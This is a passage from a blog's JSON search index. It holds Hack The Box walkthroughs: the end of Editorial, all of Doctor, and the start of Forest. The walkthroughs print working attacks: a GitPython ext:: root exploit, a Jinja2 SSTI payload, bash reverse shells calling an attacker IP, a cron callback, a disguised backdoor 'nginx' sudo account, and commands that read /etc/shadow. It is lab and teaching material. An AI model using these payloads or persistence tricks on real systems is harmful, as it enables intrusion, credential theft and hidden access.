http://127.0.0.1:5000/api/latest/metadata/messages/authors contained the following message which appears to be sent to new authors \u0026amp; it contained default creds: dev:dev080217_devAPI!@ 2. Foothold: Accessing the host by SSH as dev: I try these on the ssh service \u0026amp; they work:\nLets get our flag:\nEnumerating the host as dev: Running Linpeas: I transfer linpeas over using a simple python http server. On my attack host: On my host I navigate to where I have the linpeas.sh file stored. I run python -m http.server 9000 On the target I navigate to /tmp as it\u0026rsquo;s always world writable. I transfer the file using wget. wget http://10.10.14.80:9000/linpeas.sh Make it executable chmod +x linpeas.sh Run it ./linpeas.sh It finds nothing of note. Finding prod user password in git commits: Looking at our users home folder we can see they have an apps folder however it is empty.\nLooking further we can see it has a .git folder, meaning this was once at some point initialized as a git repo or was intended to be a git repo, which means either files have been deleted or never added. Luckily we can query the .git logs to check if files were ever present.\nI run git log --oneline and we are shown a list of previous commits, which means this was an active repo but the files have since been deleted. On the left hand side we can see the git commit hash and to the right the commit message supplied by the user for the commit.\nLooking at the commit messages we can see an interesting one \u0026ldquo;downgrading prod to dev\u0026rdquo;, now given we were able to retrieve clear text passwords from the API endpoint previously I would imagine we can find clear text creds for prod here too.\nI use git log -p b73481b to read the changes.\nLooking at the changes we can see the following. The text in red signifies it was deleted and the text in green signifies it was added \u0026amp; looking at the contents we can see it contains clear text creds for the prod account.\nprod:080217_Producti0n_2023!@ 3. Lateral Movement: Enumerating as prod: I su user to prod and it works.\nI check what sudo command\u0026rsquo;s prod can run if any:\nWe can see that we can run python3 as sudo and run the script /opt/internal_apps/clone_changes/clone_prod_change.py the fact the script is followed by the wildcard symbol * implies we can pass any arguments to this script and have it run as root Reading the contents of the script we can see it contains the following code:\n#!/usr/bin/python3 import o s import sys from git import Repo os.chdir(\u0026#39;/opt/internal_apps/clone_changes\u0026#39;) url_to_clone = sys.argv[1] r = Repo.init(\u0026#39;\u0026#39;, bare=True) r.clone_from(url_to_clone, \u0026#39;new_changes\u0026#39;, multi_options=[\u0026#34;-c protocol.ext.allow=always\u0026#34;]) This all looks pretty standard. We import OS, to interact with the operating system \u0026amp; sys to take cli args for the script. We then import Repo from Git. Code Breakdown and explanation of vulnerability: Imports and Setup:\nimport sys from git import Repo import os sys: Used to access command-line arguments. git.Repo: From the GitPython library, allows interaction with Git repositories. os: Used to interact with the host os. Change Working Directory:\nos.chdir(\u0026#39;/opt/internal_apps/clone_changes\u0026#39;) Changes the current working directory to /opt/internal_apps/clone_changes. This ensures that subsequent operations (e.g., creating or cloning repositories) occur in this directory. Command-Line Argument Handling:\nurl_to_clone = sys.argv[1] sys.argv[1]: Takes the first command-line argument after the script name as the URL of the repository to be cloned. Initialize Bare Git Repository:\nr = Repo.init(\u0026#39;\u0026#39;, bare=True) Repo.init('', bare=True): Initializes a new bare Git repository in the current directory (\u0026rsquo;\u0026rsquo; refers to the current path). A bare repository has no working tree and is typically used as a remote/shared repository. Clone a Repository:\nr.clone_from(url_to_clone, \u0026#39;new_changes\u0026#39;, multi_options=[\u0026#34;-c protocol.ext.allow=always\u0026#34;]) r.clone_from(url_to_clone, 'new_changes'): Clones the repository from url_to_clone into a directory named new_changes within the current working directory. multi_options=[\u0026quot;-c protocol.ext.allow=always\u0026quot;]: Adds a Git configuration option: -c protocol.ext.allow=always: Allows the protocol.ext transport, enabling custom protocol handlers. What does that mean in english? Here\u0026rsquo;s a simpler explanation: For the most part the script is very simple, it takes a supplied git repo as an argument and will clone it into a directory called new_changes with the current working directory. However the temporary addition being added is an issue as it allows us to execute code on the host.\nWhat does multi_options=[\u0026quot;-c protocol.ext.allow=always\u0026quot;] do? It adds a temporary configuration to the Git command being run by the script. What is protocol.ext? It\u0026rsquo;s a Git feature that allows you to define custom commands or handlers for specific types of repository URLs. What does -c protocol.ext.allow=always mean? It tells Git: \u0026ldquo;It\u0026rsquo;s okay to run custom commands whenever a repository URL starts with ext::.\u0026rdquo; Why is this important? Normally, Git disables this feature because it can be dangerous. Because it allows us to provide an argument like the below and have it execute on the host system. And as we are allowed to execute this script as root our commands will run as root! e.g. ext::sh -c 'cat //root//.ssh/id_rsa' If we google \u0026ldquo;GitPython rce\u0026rdquo; we find CVE-2022-24439 . 4. Privilege Escalation: Using CVE-2022-24439 GitPython Vulnerability to get a root shell. Initially I check if nc is installed and it is however it has been compiled without the -c or -e flags so we cannot use it for reverse shell.\nThis means we will need to use a bash shell. I run the following command to create a bash shell in the /tmp/ folder:\necho \u0026quot;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.80/80 0\u0026gt;\u0026amp;1\u0026quot; \u0026gt;\u0026gt; /tmp/notashell.sh I start my listener:\nrlwrap -cAr nc -nvlp 80 Run the python script whilst passing the shell as an argument:\nsudo python3 /opt/internal_apps/clone_changes/clone_prod_change.py \u0026#39;ext::sh -c bash% /tmp/notashell.sh\u0026#39; Get our root flag:\nWhy do we need the % sign after bash: So this was annoying me for sometime and I looked into it, every-time there is a space we need to supply the % to escape due to how argv handles special characters.\nFor instance we can read /etc/shadow by copying it to /tmp/shad by doing this:\nsudo python3 /opt/internal_apps/clone_changes/clone_prod_change.py \u0026#39;ext::sh -c cat% /etc/shadow% \u0026gt;\u0026gt;% /tmp/shad\u0026#39; We can then see if we navigate to /tmp we can read the file. This means any command can be run provided any spaces are followed by % symbol. Read the root flag this way:\nsudo python3 /opt/internal_apps/clone_changes/clone_prod_change.py \u0026#39;ext::sh -c cat% /root/root.txt% \u0026gt;\u0026gt;% /tmp/root.flag\u0026#39; 5. Persistence: Creating a high privileged \u0026ldquo;service\u0026rdquo; account for persistence: I create an account called \u0026ldquo;nginx\u0026rdquo; and give myself root privileges \u0026amp; access to the bash shell. I use this name as it\u0026rsquo;s one you could see on a machine and will raise less suspicion.\nsudo useradd -m -s /bin/bash nginx\nCreates a new user named nginx. -m: Creates a home directory for the user. -s /bin/bash: Sets the user\u0026rsquo;s default shell to /bin/bash. sudo usermod -aG sudo nginx\nAdds the nginx user to the sudo group. -a: Appends the user to the group (avoids overwriting existing groups). -G sudo: Specifies the sudo group. sudo passwd nginx\nSets or updates the password for the nginx user. Prompts us to add a new password and confirms it. I switch to the newly created user\nI check we have sudo privileges, as expected we do.\nI ensure we can actually read sudo level files by reading /etc/shadow\nLessons Learned: What did I learn? I learned about retrieving data from git logs. I learned about the python git vulnerability CVE-2022-24439: What silly mistakes did I make? Oh I did not use a forward slash at one point in a command and that was stumping reading the API endpoints at one point, that was fun. Sign off: Remember, folks as always: with great power comes great pwnage. Use this knowledge wisely, and always stay on the right side of the law!\nUntil next time, hack the planet!\n– Bloodstiller\n– Get in touch bloodstiller at proton dot me\n", 
        "url": "http:\/\/localhost:1313\/walkthroughs\/editorial-box\/"
    },
    
    "http:\/\/localhost:1313\/tags\/git\/": {
        "title": "Git",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/git\/"
    },
    
    "http:\/\/localhost:1313\/tags\/web\/": {
        "title": "Web",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/web\/"
    },
    
    "http:\/\/localhost:1313\/walkthroughs\/doctor-box\/": {
        "title": "Doctor HTB Walkthrough",
        "tags": ["Box","HTB","Easy","Linux","SSTI","Splunk","Persistence","Web",],
        "content": "Doctor Hack The Box Walkthrough/Writeup: https://app.hackthebox.com/machines/Doctor How I use variables \u0026amp; Wordlists: Variables:\nIn my commands you are going to see me use $box, $user, $hash, $domain, $pass often. I find the easiest way to eliminate type-os \u0026amp; to streamline my process it is easier to store important information in variables \u0026amp; aliases. $box = The IP of the box $pass = Passwords I have access to. $user = current user I am enumerating with. Depending on where I am in the process this can change if I move laterally. $domain = the domain name e.g. sugarape.local or contoso.local $machine = the machine name e.g. DC01 Why am I telling you this? People of all different levels read these writeups/walktrhoughs and I want to make it as easy as possible for people to follow along and take in valuable information. Wordlists:\nI have symlinks all setup so I can get to my passwords from ~/Wordlists so if you see me using that path that\u0026rsquo;s why. If you are on Kali and following on, you will need to go to /usr/share/wordlists I also use these additional wordlists: Statistically-likely-usernames SecLists Auto_Wordlists 1. Enumeration: NMAP: Basic Scans: Basic TCP Scan: nmap $box -Pn -oA TCPbasicScan 🕙 13:37:21 zsh ❯ nmap $box -Pn -oA TCPbasicScan Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-20 13:37 GMT Nmap scan report for 10.129.2.21 Host is up (0.041s latency). Not shown: 997 filtered tcp ports (no-response) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 8089/tcp open unknown Initial thoughts: SSH, HTTP and what could be Splunk running on 8089. Comprehensive Scans: In depth scan TCP: sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP [sudo] password for kali: Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-20 13:38 GMT Nmap scan report for 10.129.2.21 Host is up (0.038s latency). Not shown: 65532 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 59:4d:4e:c2:d8:cf:da:9d:a8:c8:d0:fd:99:a8:46:17 (RSA) | 256 7f:f3:dc:fb:2d:af:cb:ff:99:34:ac:e0:f8:00:1e:47 (ECDSA) |_ 256 53:0e:96:6b:9c:e9:c1:a1:70:51:6c:2d:ce:7b:43:e8 (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Doctor 8089/tcp open ssl/http Splunkd httpd |_http-title: Splunkd | ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser | Not valid before: 2020-09-06T15:57:27 |_Not valid after: 2023-09-06T15:57:27 |_http-server-header: Splunkd | http-robots.txt: 1 disallowed entry |_/ Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Device type: general purpose|specialized Running (JUST GUESSING): Linux 5.X|4.X|2.6.X (95%), Crestron 2-Series (86%) OS CPE: cpe:/o:linux:linux_kernel:5.0 cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:2.6.32 cpe:/o:crestron:2_series Aggressive OS guesses: Linux 5.0 (95%), Linux 4.15 - 5.8 (90%), Linux 5.0 - 5.4 (90%), Linux 5.3 - 5.4 (89%), Linux 2.6.32 (89%), Linux 5.0 - 5.5 (88%), Crestron XPanel control system (86%) No exact OS matches for host (test conditions non-ideal). Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 172.25 seconds Findings: System is running apache \u0026amp; ubuntu. Interestingly it\u0026rsquo;s running Splunk, which is a log analytics tool used to gather, analyze and visualize data, Splunk is often used for security monitoring and business analytics. What is also good is I know it\u0026rsquo;s possible to get RCE via Splunk if we can get access to the console, also splunk is often running with elevated privileges as it\u0026rsquo;s dealing with system logs. This could be a viable privesc path if we can get access. Splunk: 8089: This is a great resources which shows Splunk\u0026rsquo;s default ports and what they are used for:\nAs we can see it\u0026rsquo;s most likely a management or API port: I try and connect but the page will not load. I also try curling but the connection is continually reset by the host. I am going to restart the host as this in my experience, is not intended behavior from the Splunk Universal Forwarder.\nSplunk Universal Forwarder Primer: Whilst we wait on the box resetting here is a primer on the Splunk universal forwarder and what it does.\nThink of the Universal Forwarder as Splunk\u0026rsquo;s specialized data courier - a stripped-down version of Splunk Enterprise that\u0026rsquo;s been optimized getting log data from point A to point B, as quickly as possible.\nBy eliminating non-essential components like the UI and Python interpreter, it achieves remarkable performance with minimal system footprint.\nStrategic limitations:\nThe UF\u0026rsquo;s limitations are actually strategic design choices. These constraints ensure maximum reliability and minimal attack surface - crucial for security-focused deployments. No data parsing capabilities (raw data forwarding only) Absence of UI and Python support Limited local filtering options Security Features:\nSSL/TLS encryption for data in transit Configurable authentication mechanisms Queue persistence during network outages Robust metadata tagging for forensic integrity The UF shines in several security-critical scenarios:\nEnterprise-wide endpoint telemetry collection Real-time security log aggregation Compliance data gathering Network traffic monitoring Enumerating Splunk: After the reset I can view the page as expected and it appears it is the Universal Forwarder.\nI check all links and two are requesting login credentials serviceNS \u0026amp; service\nI run some very basic cred stuffing, admin:admin, root:root etc, but none grant access.\nI know that it is possible to privesc using the universal forwarder as I have read these article\u0026rsquo;s Airman\u0026rsquo;s article \u0026amp; Clement Notin\u0026rsquo;s article before however credentials are required so let\u0026rsquo;s put a pin in this.\nWeb 80: Web Enumeration via Burp Suite: When enumerating a website, always use Burp Suite. This allows you to: Record all potential injection points. Capture relevant responses for each request, making it easier to analyze vulnerabilities and track your testing progress. Initial Enumeration: Browsing to the site we can see it has the domain listed as doctors.htb in an email address. I will add this to my /etc/hosts file for easy scanning Enumerating doctors.htb After adding doctors.htb to my hosts file I navigate to the page and fine a Secure Messaging Service I add some test data as to it\u0026rsquo;s response. I get the response: \u0026ldquo;Nope, no such luck\u0026rdquo; I create a new account following the signup process: Finding /archive in the html of the homepage Looking at the source code of the /home page once logged in we can see the following hmtl comment.\nI navigate to /archive however it appears to be a blank page\nHowever if we look at the source-code we can see there is xml content I create a test post\nAnd when I look back in the archive I can see it\u0026rsquo;s listed as an item.\nAs we can see it\u0026rsquo;s pulling the title through in the title tags. Which means it may be vulnerable to SSTI. Fuzzing for SSTI and discovering the template engine. The table below shows what the input and the correct responses should be and then how we should progress. There is a handy flow chart that corresponds to this on payload all the things: Payload Path Taken Template Engine Result Response/Output ${7*7} Direct Input Smarty ✅ Vulnerable 49 Mako ❓ Unknown Unknown a{*comment*}b Comment Handling Input Smarty ✅ Vulnerable ab ${\u0026quot;\u0026quot;.join(\u0026quot;ab\u0026quot;)} Join Function Injection Smarty ✅ Vulnerable ab Mako ✅ Vulnerable ab Jinja2 ❓ Unknown Unknown {{7*7}} Double Braces Input Jinja2 ✅ Vulnerable 49 Twig ✅ Vulnerable 49 Unknown ❓ Unknown Unknown {{7*'7'}} String Multiplication Attempt Jinja2 ✅ Vulnerable 7777777 Twig ✅ Vulnerable 49 Same content as a list for fuzzing: ${7*7} a{*comment*}b ${\u0026#34;\u0026#34;.join(\u0026#34;ab\u0026#34;)} {{7*7}} {{7*\u0026#39;7\u0026#39;}} I capture a POST request in burp for the creation of a new pose and send to intruder. I then select my injection point and load my payload list.\n+Note+: You want to ensure that URL encoding is OFF. I then request the archive again and see the following:\nIf we cross-reference that with the image \u0026amp; table I have above we can see that the only payloads that were processed were the final two {{7*7}} \u0026amp; {{7*'7'}} and given their responses, 49 for payload 1 and 7777777 for payload 2 we know that this template engine is jinja2. RCE POC: Even though the above does prove RCE I want to verify this further.\nI create a new post with the following content as if we have RCE the /etc/passwd file is world readable so can confirm.\n{{ self.__init__.__globals__.__builtins__.__import__(\u0026#39;os\u0026#39;).popen(\u0026#39;cat /etc/passwd\u0026#39;).read() }} I save it then navigate to /archive in order for the SSTI template engine to process the payload. We have RCE, let\u0026rsquo;s get a shell. 2. Foothold: Getting a reverse shell via SSTI: I repeat the same process with this payload: {% for x in ().__class__.__base__.__subclasses__() %}{% if \u0026#34;warning\u0026#34; in x.__name__%}{{x()._module.__builtins__[\u0026#39;__import__\u0026#39;](\u0026#39;os\u0026#39;).popen(\u0026#34;bash -c \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.80/9967 0\u0026gt;\u0026amp;1\u0026#39;\u0026#34;).read()}}{%endif%}{%endfor%} Reverse shell caught:\nExploit/Reverse Shell Breakdown: The payload:\n{% for x in ().__class__.__base__.__subclasses__() %} {% if \u0026#34;warning\u0026#34; in x.__name__ %} {{x()._module.__builtins__[\u0026#39;__import__\u0026#39;](\u0026#39;os\u0026#39;).popen(\u0026#34;bash -c \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.80/9967 0\u0026gt;\u0026amp;1\u0026#39;\u0026#34;).read()}} {% endif %} {% endfor %} Step-by-step Analysis\nTraversal of Python Classes:\n().__class__ retrieves the class of an empty tuple (e.g., \u0026lt;class 'tuple'\u0026gt;). ().__class__.__base__ accesses the base class of tuple, which is \u0026lt;class 'object'\u0026gt;. ().__class__.__base__.__subclasses__() enumerates all subclasses of the base object class. Purpose: This enables us to traverse the entire Python object hierarchy, including security-sensitive classes. Why: This traversal is necessary to gain access to internal classes that may expose sensitive or powerful functionality. The goal is to locate a class that allows interaction with Python\u0026rsquo;s built-in capabilities, particularly those capable of importing modules or executing commands. Without this enumeration, we wouldn\u0026rsquo;t be able to dynamically discover and exploit useful subclasses like warnings.WarningMessage. Simple Terms: It’s like looking through a list of all possible tools in Python to find one that can break the system. Finding a Specific Subclass:\nfor x in ().__class__.__base__.__subclasses__(): Iterates through all subclasses of object. if \u0026quot;warning\u0026quot; in x.__name__: Filters for a subclass where \u0026quot;warning\u0026quot; exists in the class name. Example match: \u0026lt;class 'warnings.WarningMessage'\u0026gt;. Why: Not all subclasses are useful for exploitation. The filter specifically targets classes that are likely to provide the _module attribute or similar access to the __builtins__ dictionary. warnings.WarningMessage is chosen because it provides a pathway to Python’s built-in functions through its _module attribute. We use this class as a pivot to access the dangerous __builtins__['__import__'] method, which allows importing any module dynamically. Simple Terms: It’s like picking a specific tool from the list (a warning-related tool) because it opens the door to other powerful tools hidden inside Python. Accessing Built-in Functions:\nx()._module: Accesses the module of the identified subclass. .__builtins__: Retrieves the built-in functions of the module. ['__import__']('os'): Dynamically imports the os module. Executing the Reverse Shell Command:\nos.popen(\u0026quot;bash -c 'bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.80/9967 0\u0026gt;\u0026amp;1'\u0026quot;).read(): Opens a subprocess to execute a reverse shell command. Effect: The server connects to our machine (10.10.14.80) on port 9967, granting remote access. Exploitation Mitigation Techniques: Input Validation: Ensure user inputs are sanitized before being passed to the template. Use Sandboxed Template Engines: Configure Jinja2 with a sandbox to limit its capabilities. Disable Dangerous Features: Restrict access to functions like __builtins__ or os that can execute arbitrary commands. Discovering Our User is part of the adm group: Looking through the host there is a user called shaun, however we cannot read anything in his home directory, however we can list the contents.\nI check our group membership and can see our user is part of the adm group.\nadm primer:\nMembers of the adm group are able to read all logs stored in /var/log. This does not directly grant root access, but could be leveraged to gather sensitive data stored in log files or enumerate user actions and running cron jobs. We can run to search for creds: find /var/log -type f -exec grep \u0026#34;password\u0026#34; {} + find /var/log -type f -exec grep \u0026#34;username\u0026#34; {} + Finding a clear text password in /var/log/apache2 logs I run find /var/log -type f -exec grep \u0026quot;password\u0026quot; {} + \u0026amp; discover a clear text password.\nGuitar123 +Note+: Even though it appears to be being passed as an argument to the email parameter it\u0026rsquo;s not an email so we can surmise it\u0026rsquo;s a password entered incorrectly in the email field. I check if it\u0026rsquo;s valid for \u0026ldquo;Shaun\u0026rdquo; \u0026amp; can login as him\n+Note+: I check if it\u0026rsquo;s valid for ssh but it\u0026rsquo;s not. Enumerating as shaun: Let\u0026rsquo;s grab our user flag.\nI do some further enumeration but nothing is found on the host that I can see.\n3. Privilege Escalation: Logging into splunk Universal Forwarder as shaun: I re-open the splunk universal forwarder page and try shauns creds \u0026amp; they work. This time I provided with alot more options.\nNow we can enumerate this, however I know for a fact that with creds we can privesc using SplunkWhisperer2 .\nGetting root using SplunkWhisperer2 to exploit the Universal Forwarder: Quick POC to verify RCE:\nI stand up a quick python web-server and have SplunkWhisperer curl it to verify that we can infact run commands on the host \u0026amp; we can. Getting our reverse root shell:\npython3 PySplunkWhisperer2_remote.py --host $box --lhost 10.10.14.80 --username $user --password $pass --payload \u0026#34;bash -c \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.80/9967 0\u0026gt;\u0026amp;1\u0026#39;\u0026#34; Lets get the root flag:\n4. Persistence: As a means to ensure persistence on this machine I will create and add an SSH key as we know that service is running. I will also add a cronjob that calls back out to my attack machine at a set interval. Persistence Method 1: Creating a cron job reverse shell: (crontab -l \u0026gt; .tab ; echo \u0026#34;* * * * * /bin/bash -c \u0026#39;/bin/bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.80/80 0\u0026gt;\u0026amp;1\u0026#39;\u0026#34; \u0026gt;\u0026gt; .tab ; crontab .tab ; rm .tab) \u0026gt; /dev/null 2\u0026gt;\u0026amp;1 Let\u0026rsquo;s verify it\u0026rsquo;s in the crontab by running crontab -l\nAs we can see it\u0026rsquo;s running. I start my listener and get a connection back after 1 minute.\n+Note+: This is great as a means to call back out to our attack machine, however an interval of every 1 minute is excessive, it would typically be better to set it at longer intervals to re-connect.\nPersistence Method 2: Adding an SSH key: So typically what we could do is make a new user, however I am going to generate a key for the root user we already have access too. Generate SSH Key for the User:\nssh-keygen -t rsa -b 4096 Copy Public Key to Authorized Keys:\ncp ~/.ssh/id_rsa.pub ~/.ssh/authorized_keys This command copies the public key to the authorized_keys file, which is used by SSH to authenticate the user. Copy Private key to attack machine:\ncat id_rsa Change the mode of the key so the permissions are not too open:\nsudo chmod 400 id_rsa Verify it works:\nssh -i id_rsa root@$box Lessons Learned: What did I learn? This took my way longer to complete than I would have liked. Web is currently my weakest area so I am making a concerted effort to do these types of boxes and challenges in order to improve my web weaknesses. I learned to always look at source code even if the page appears empty or unimportant. As two key pieces of information were found this way. The initial html comment regarding /archive on the message upload page. The xml contents of the /archive page itself which provided the foothold as we were able to fuzz for SSTI. I also learned I am going to grind these like I did AD boxes to improve. Doing lots of AD boxes really helped me get better and dial in. What silly mistakes did I make? I tried for a long time to connect to Splunks Universal Forwarder with HTTP, instead of HTTPS that wasted a good few mins. I had a moment where my brain was fried when figuring out cron syntax, luckily this exists https://cron.help Sign off: Remember, folks as always: with great power comes great pwnage. Use this knowledge wisely, and always stay on the right side of the law!\nUntil next time, hack the planet!\n– Bloodstiller\n– Get in touch bloodstiller at bloodstiller dot com\n", 
        "url": "http:\/\/localhost:1313\/walkthroughs\/doctor-box\/"
    },
    
    "http:\/\/localhost:1313\/tags\/persistence\/": {
        "title": "Persistence",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/persistence\/"
    },
    
    "http:\/\/localhost:1313\/tags\/splunk\/": {
        "title": "Splunk",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/splunk\/"
    },
    
    "http:\/\/localhost:1313\/tags\/ssti\/": {
        "title": "SSTI",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/ssti\/"
    },
    
    "http:\/\/localhost:1313\/articles\/": {
        "title": "Articles",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/articles\/"
    },
    
    "http:\/\/localhost:1313\/tags\/asreproasting\/": {
        "title": "ASREPRoasting",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/asreproasting\/"
    },
    
    "http:\/\/localhost:1313\/tags\/dacl\/": {
        "title": "DACL",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/dacl\/"
    },
    
    "http:\/\/localhost:1313\/tags\/download-cradle\/": {
        "title": "Download Cradle",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/download-cradle\/"
    },
    
    "http:\/\/localhost:1313\/walkthroughs\/forest-box\/": {
        "title": "Forest HTB Walkthrough",
        "tags": ["Box","HTB","Easy","Windows","LDAP","Active Directory","DACL","GenericWrite","GenericAll","Kerberos","ASREPRoasting","mimikatz","Download Cradle",],
        "content": "Forest Hack The Box Walkthrough/Writeup: https://app.hackthebox.com/machines/Forest How I use variables \u0026amp; Wordlists: Variables:\nIn my commands you are going to see me use $box, $user, $hash, $domain, $pass often. I find the easiest way to eliminate type-os \u0026amp; to streamline my process it is easier to store important information in variables \u0026amp; aliases. $box = The IP of the box $pass = Passwords I have access to. $user = current user I am enumerating with. Depending on where I am in the process this can change if I move laterally. $domain = the domain name e.g. sugarape.local or contoso.local $machine = the machine name e.g. DC01 Why am I telling you this? People of all different levels read these writeups/walktrhoughs and I want to make it as easy as possible for people to follow along and take in valuable information. Wordlists:\nI have symlinks all setup so I can get to my passwords from ~/Wordlists so if you see me using that path that\u0026rsquo;s why. If you are on Kali and following on, you will need to go to /usr/share/wordlists I also use these additional wordlists: Statistically-likely-usernames SecLists Auto_Wordlists 1. Enumeration: NMAP: Basic Scans: Basic TCP Scan: nmap $box -Pn -oA TCPbasicScan kali in HTB/BlogEntriesMade/Forest/scans/nmap 🍣 main 2GiB/7GiB | 0B/1GiB with /usr/bin/zsh 🕙 12:54:10 zsh ❯ nmap $box -Pn -oA TCPbasicScan Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-13 12:54 GMT Nmap scan report for 10.129.95.210 Host is up (0.039s latency). Not shown: 989 closed tcp ports (reset) PORT STATE SERVICE 53/tcp open domain 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl Nmap done: 1 IP address (1 host up) scanned in 0.81 seconds Initial thoughts: DNS Kerberos SMB RPC LDAP Comprehensive Scans: In depth scan TCP:\nsudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP kali in HTB/BlogEntriesMade/Forrest/scans/nmap 🍣 main 2GiB/7GiB | 0B/1GiB with /usr/bin/zsh 🕙 14:04:14 zsh ❯ sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-13 14:04 GMT Stats: 0:00:48 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan SYN Stealth Scan Timing: About 92.80% done; ETC: 14:05 (0:00:04 remaining) Nmap scan report for htb.local (10.129.107.25) Host is up (0.042s latency). Not shown: 65512 closed tcp ports (reset) PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2024-11-13 14:05:31Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name) 445/tcp open microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB) 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name) 3269/tcp open tcpwrapped 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 9389/tcp open mc-nmf .NET Message Framing 47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Not Found |_http-server-header: Microsoft-HTTPAPI/2.0 49664/tcp open msrpc Microsoft Windows RPC 49665/tcp open msrpc Microsoft Windows RPC 49666/tcp open msrpc Microsoft Windows RPC 49667/tcp open msrpc Microsoft Windows RPC 49670/tcp open msrpc Microsoft Windows RPC 49676/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 49677/tcp open msrpc Microsoft Windows RPC 49681/tcp open msrpc Microsoft Windows RPC 49698/tcp open msrpc Microsoft Windows RPC No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.94SVN%E=4%D=11/13%OT=53%CT=1%CU=40018%PV=Y%DS=2%DC=I%G=Y%TM=673 OS:4B276%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10B%TI=I%CI=I%TS=C)SEQ( OS:SP=106%GCD=1%ISR=10B%TI=I%CI=I%II=I%SS=S%TS=A)SEQ(SP=106%GCD=1%ISR=10B%T OS:I=RD%CI=I%TS=3)OPS(O1=M53CNW8ST11%O2=M53CNW8ST11%O3=M53CNW8NNT11%O4=M53C OS:NW8ST11%O5=M53CNW8ST11%O6=M53CST11)WIN(W1=2000%W2=2000%W3=2000%W4=2000%W OS:5=2000%W6=2000)ECN(R=Y%DF=Y%T=80%W=2000%O=M53CNW8NNS%CC=Y%Q=)T1(R=Y%DF=Y OS:%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F OS:=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y% OS:T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIP OS:L=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z) Network Distance: 2 hops Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-security-mode: | 3:1:1: |_ Message signing enabled and required | smb-os-discovery: | OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3) | Computer name: FOREST | NetBIOS computer name: FOREST\\x00 | Domain name: htb.local | Forest name: htb.local | FQDN: FOREST.htb.local |_ System time: 2024-11-13T06:06:36-08:00 | smb-security-mode: | account_used: \u0026lt;blank\u0026gt; | authentication_level: user | challenge_response: supported |_ message_signing: required | smb2-time: | date: 2024-11-13T14:06:40 |_ start_date: 2024-11-13T14:01:08 |_clock-skew: mean: 2h40m00s, deviation: 4h37m08s, median: 0s OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 132.69 seconds +Note+: I had to do a reset of the box as this scan was hanging. SMB 445: Attempting to connect with NULL \u0026amp; Guest sessions: This is a standard check I always try as alot of the time the guest account or 